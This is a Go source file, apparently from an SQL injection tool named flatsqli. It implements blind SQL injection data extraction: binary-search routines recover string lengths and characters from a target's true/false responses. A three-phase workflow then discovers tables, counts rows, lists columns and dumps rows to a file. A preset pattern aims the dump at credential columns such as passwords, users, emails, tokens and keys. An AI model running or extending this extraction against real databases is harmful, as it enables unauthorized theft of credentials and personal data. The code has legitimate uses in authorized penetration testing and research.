package finder

import (
	"fmt"

	"github.com/morkin1792/flatsqli/internal/storage"
	"github.com/morkin1792/flatsqli/internal/ui"
)

// formatRowCount formats a row count for display
// Returns "+1M" for -1, "~100K" for approximate large values, exact number for small values
func formatRowCount(count int) string {
	switch {
	case count == -1:
		return "+1M"
	case count >= 1000:
		return fmt.Sprintf("+%dK", count/1000)
	default:
		return fmt.Sprintf("%d", count)
	}
}

// extractString extracts a string value using binary search
func (f *Finder) extractString(query string) (string, error) {
	if f.payloadGen == nil {
		ui.Verbose(f.verbose, "WARNING: payloadGen is nil!")
		return "", nil
	}

	// First, find the length
	length, err := f.findLength(query)
	if err != nil {
		return "", err
	}

	if length == 0 {
		return "", nil
	}

	// Apply max length limit
	if f.maxLen > 0 && length > f.maxLen {
		length = f.maxLen
	}

	// Load cache for prediction
	knownStrings := storage.LoadKnownStrings(f.host)
	var candidates []string
	for _, s := range knownStrings {
		if len(s) == length {
			candidates = append(candidates, s)
		}
	}

	// Extract each character
	result := make([]byte, 0, length)
	for i := 1; i <= length; i++ {
		var char byte
		var found bool

		// 1. Try prediction from cache
		if len(candidates) > 0 {
			// Get unique next characters from candidates
			nextChars := make(map[byte]bool)
			for _, s := range candidates {
				nextChars[s[i-1]] = true
			}

			// Test each candidate character
			for c := range nextChars {
				payload := f.payloadGen.GetEqualityPayload(query, i, int(c))
				resp, err := f.requester.Send(payload)
				if err != nil {
					// On error, let's propagate error to trigger retry/fallback logic outside
					if len(result) > 0 {
						return string(result), err
					}
					return "", err
				}

				if f.calibration.IsTrue(resp.Fingerprint) {
					char = c
					found = true

					// Filter candidates to keep only matches
					var nextCandidates []string
					for _, s := range candidates {
						if s[i-1] == c {
							nextCandidates = append(nextCandidates, s)
						}
					}
					candidates = nextCandidates
					break
				}
			}

			// If no prediction matched, we deviated from known strings
			if !found {
				candidates = nil // Stop using cache for this string
			}
		}

		// 2. Fallback to Binary Search if not found in cache
		if !found {
			var err error
			char, err = f.findChar(query, i)
			if err != nil {
				if len(result) > 0 {
					return string(result), err
				}
				return "", err
			}
		}

		result = append(result, char)
		// Show live extraction progress
		ui.Progress("Extracting: %s [%d/%d]", string(result), i, length)
	}

	// Save the new string to cache
	storage.SaveKnownString(f.host, string(result))

	return string(result), nil
}

// findLength finds the length of a query result using binary search
func (f *Finder) findLength(query string) (int, error) {
	low := 0
	high := 256

	// Check if there's any data
	payload := f.payloadGen.GetLengthPayload(query, 0)
	resp, err := f.requester.Send(payload)
	if err != nil {
		return 0, err
	}

	if !f.calibration.IsTrue(resp.Fingerprint) {
		return 0, nil
	}

	// Binary search for exact length
	for low < high {
		mid := (low + high + 1) / 2
		payload := f.payloadGen.GetLengthPayload(query, mid-1)

		resp, err := f.requester.Send(payload)
		if err != nil {
			return 0, err
		}

		if f.calibration.IsTrue(resp.Fingerprint) {
			low = mid
		} else {
			high = mid - 1
		}
	}

	return low, nil
}

// findChar finds a character at a position using binary search
func (f *Finder) findChar(query string, pos int) (byte, error) {
	low := 32
	high := 126

	for low < high {
		mid := (low + high + 1) / 2
		payload := f.payloadGen.GetCharPayload(query, pos, mid-1)

		resp, err := f.requester.Send(payload)
		if err != nil {
			return 0, err
		}

		if f.calibration.IsTrue(resp.Fingerprint) {
			low = mid
		} else {
			high = mid - 1
		}
	}

	return byte(low), nil
}

// ImportantDataPattern is the preset pattern for -find-important-data
const ImportantDataPattern = "senha,pass,pwd,usuario,user,email,secret,login,token,credential,key"

// Run executes the full finder workflow
// Cache behavior: skips table discovery if tables cached, skips column retrieval if columns cached
func (f *Finder) Run(pattern string, tableLimit, rowLimit int, useCache bool, outputFile string) error {
	var tableNames []string
	var tableColumns map[string][]string

	// Try to load cached tables for this host
	cachedTables, cacheHit := storage.LoadTables(f.host)
	if useCache && cacheHit && len(cachedTables) > 0 {
		// Use cached table names - skip Phase 1
		ui.Info("Phase 1: Using %d cached tables", len(cachedTables))
		tableColumns = make(map[string][]string)
		for tableName, tableCache := range cachedTables {
			tableNames = append(tableNames, tableName)
			if tableCache != nil {
				tableColumns[tableName] = tableCache.Columns
			}
		}
	} else {
		// Phase 1: Find matching tables
		ui.Info("Phase 1: Discovering tables...")
		matches, err := f.FindColumns(pattern, tableLimit, func(tableName string) {
			_ = storage.AddTableColumn(f.host, tableName, "")
		})
		if err != nil {
			return err
		}

		if len(matches) == 0 {
			ui.Info("No columns found matching pattern")
			return nil
		}

		// Group by table and get unique table names
		tableColumns = GroupByTable(matches)
		for tableName := range tableColumns {
			tableNames = append(tableNames, tableName)
		}
	}

	// Get row counts for all tables
	tableRowCounts := make(map[string]int)
	for _, tableName := range tableNames {
		ui.Progress("Counting rows in %s...", tableName)
		rowCount, err := f.GetRowCount(tableName)
		if err != nil {
			ui.Verbose(f.verbose, "Could not get row count: %v", err)
			rowCount = 0
		}
		tableRowCounts[tableName] = rowCount
	}
	ui.ProgressDone()

	// Print table summary
	ui.Success("Found %d tables:", len(tableNames))
	for _, tableName := range tableNames {
		rowCount := tableRowCounts[tableName]
		rowStr := formatRowCount(rowCount)
		ui.Info("  - %s (%s rows)", tableName, rowStr)
	}

	// Phase 2: Get columns for each table
	ui.Info("Phase 2: Retrieving columns...")
	tableAllColumns := make(map[string][]string)
	for _, tableName := range tableNames {
		if tableRowCounts[tableName] == 0 {
			ui.Info("Skipping columns for %s (0 rows)", tableName)
			continue
		}

		// Check if columns are already cached for this table
		if useCache && cacheHit {
			if tc, ok := cachedTables[tableName]; ok && tc != nil && len(tc.Columns) > 0 {
				// Validate: check if cached count matches actual column count
				actualCount, err := f.GetColumnCount(tableName)
				if err == nil && actualCount == len(tc.Columns) {
					tableAllColumns[tableName] = tc.Columns
					ui.Info("  - %s: %d columns (cached)", tableName, len(tc.Columns))
					continue
				}
				// Cache is incomplete, need to fetch
				ui.Verbose(f.verbose, "Cache incomplete for %s: cached %d, actual %d", tableName, len(tc.Columns), actualCount)
			}
		}

		// Retrieve columns from database
		allColumns, err := f.GetTableColumns(tableName, func(colName string) {
			_ = storage.AddTableColumn(f.host, tableName, colName)
		})
		if err != nil || len(allColumns) == 0 {
			ui.Verbose(f.verbose, "Could not get all columns for %s, using matched columns only", tableName)
			allColumns = tableColumns[tableName]
		}
		tableAllColumns[tableName] = allColumns
		ui.Info("  - %s: %d columns", tableName, len(allColumns))
	}

	// Prepare output data
	var outputData []TableData

	// Initialize output file before Phase 3
	if outputFile != "" {
		if err := InitOutputFile(outputFile); err != nil {
			ui.Verbose(f.verbose, "Failed to create output file: %v", err)
		}
	}

	// Phase 3: Extract rows
	ui.Info("Phase 3: Extracting data...")
	for _, tableName := range tableNames {
		columns := tableAllColumns[tableName]
		rowCount := tableRowCounts[tableName]

		// Determine actual rows to extract
		actualLimit := rowLimit
		if rowCount < rowLimit && rowCount > 0 {
			actualLimit = rowCount
		}

		if actualLimit == 0 || len(columns) == 0 {
			ui.Info("Skipping %s (0 rows or columns)", tableName)
			continue
		}

		ui.Info("Extracting %d rows from %s...", actualLimit, tableName)

		// Extract rows (uses cached row values for prediction)
		rows, err := f.ExtractTableRowsWithCache(tableName, columns, actualLimit, pattern)
		if err != nil {
			ui.Verbose(f.verbose, "Failed to extract rows: %v", err)
			continue
		}

		// Save rows to cache
		for _, row := range rows {
			rowMap := make(map[string]string)
			for i, col := range columns {
				if i < len(row) {
					rowMap[col] = row[i]
				}
			}
			_ = storage.AddTableRow(f.host, tableName, rowMap)
		}

		tableData := TableData{
			TableName: tableName,
			Columns:   columns,
			Rows:      rows,
			RowCount:  rowCount,
		}
		outputData = append(outputData, tableData)

		// Write to output file immediately
		if outputFile != "" {
			if err := AppendTableToOutput(outputFile, tableData); err != nil {
				ui.Verbose(f.verbose, "Failed to append to output file: %v", err)
			}
		}

		// Print results
		PrintTableData(tableData)
	}

	if outputFile != "" && len(outputData) > 0 {
		ui.Info("Output written to: %s", outputFile)
	}

	// Save columns to cache (rows are saved incrementally above)
	cacheData := make(map[string]*storage.TableCache)
	for tableName, cols := range tableAllColumns {
		cacheData[tableName] = &storage.TableCache{Columns: cols}
	}
	if len(cacheData) > 0 {
		if err := storage.SaveTables(f.host, cacheData); err != nil {
			ui.Verbose(f.verbose, "Failed to save cache: %v", err)
		}
	}

	return nil
}

// ExtractTableRowsWithCache extracts rows using cached values for prediction
func (f *Finder) ExtractTableRowsWithCache(tableName string, columns []string, rowLimit int, pattern string) ([][]string, error) {
	// Get cached rows for prediction
	cachedRows := storage.GetTableRows(f.host, tableName)

	// Build prediction values from cached rows
	var predictionValues []string
	for _, row := range cachedRows {
		for _, value := range row {
			if value != "" {
				predictionValues = append(predictionValues, value)
			}
		}
	}

	return f.ExtractTableRows(tableName, columns, rowLimit)
}
